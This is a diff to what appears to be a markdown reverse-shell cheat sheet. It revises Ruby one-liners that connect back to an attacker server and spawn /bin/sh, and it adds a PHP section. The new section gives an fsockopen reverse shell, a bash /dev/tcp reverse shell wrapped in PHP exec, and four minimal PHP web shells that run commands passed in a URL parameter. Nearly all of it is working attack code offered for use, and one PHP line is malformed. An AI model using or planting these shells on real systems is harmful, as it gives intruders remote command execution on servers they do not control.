@@ -96,11 +96,11 @@ Of course the reverse shell options are always going to be dependent on the inst
 ### Ruby
 If ruby is installed instead of python or you prefer ruby, then the reverse shell is just as easy and you can follow the steps above to escalate to full shell :
 
-> ruby -rsocket -e"f=TCPSocket.open('10.0.0.1',8001).to_i;exec sprintf('/bin/sh -i <&%d >&%d 2>&%d',f,f,f)"
+> ruby -rsocket -e"f=TCPSocket.open('\<yourserver>',8001).to_i;exec sprintf('/bin/sh -i <&%d >&%d 2>&%d',f,f,f)"
 
 - If for some reason you can't get the /bin/sh or any other shell, you could use IO to execute commands :
 
-> ruby -rsocket -e "exit if fork;c=TCPSocket.new('10.0.0.1',8001);while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end"
+> ruby -rsocket -e "exit if fork;c=TCPSocket.new('\<yourserver>',8001);while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end"
 
 - As with python if all else fails and you can't get a shell serve the current directory over a web interface :
 
@@ -109,6 +109,46 @@ If ruby is installed instead of python or you prefer ruby, then the reverse shel
 <hr>
 
 ### PHP
+The best thing about php is that it is almost always installed (even if just for the might need it later sysadmin), certainly if there is any sort of database used on the system. Just remember for a reverse shell served as a .php file across the web service might require you enabling the php module for apache etc :
 
+> php -r "$sock=fsockopen('\<yourserver>,8001);exec('/bin/sh -i <&3 >&3 2>&3');"
 
+- If you are having a problem with the above reverse shell or getting an error related to file descriptors replace 3 with another file descriptor like 4 or 5 etc.
+
+	    Example : php -r "$sock=fsockopen('10.10.10.145',8001);exec('/bin/sh -i <&5 >&5 2>&5');"
+
+- Again as with the other options so far if all else fails and you can't get a reverse shell from the CLI you can always try over the web service (assuming the hp module is enabled). A quick cheeky one liner for the php file would be to use our bash reverse shell (remember to start a listener on your server first) :
+
+	> <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/\10.10.10.145/8001 0>&1'"); ?>
  
+ - or here are a few complete reverse shells using the browser as the CLI  (file saved as 1.php):
+ 
+ 
+
+	    <pre> <?= $_GET[1] ?>
+	    
+		    called via browser: http://someserver.com/somedir/1.php?1=ls%20-lah
+
+	<br>
+
+		<pre> <? echo passthru($_GET['cmd']); ?>
+		
+			called via browser: http://someserver.com/somedir/1.php?cmd=whoami
+	
+	<br>
+
+	    <pre> <?php echo system($_GET["c"]); ?>
+	    
+		    called via browser : http://someserver/somedir/1.php?c=id
+
+	 <br>
+
+	    <pre> <?php echo shell_exec($_GET["sc"]." 2>&1"); ?>
+	    
+		    called via browser : http://someserver/1.php?sc=ls%20-lah%20/tmp
+
+- Doesn't get much smaller and easier than that.
+
+<hr>
+
+### Perl
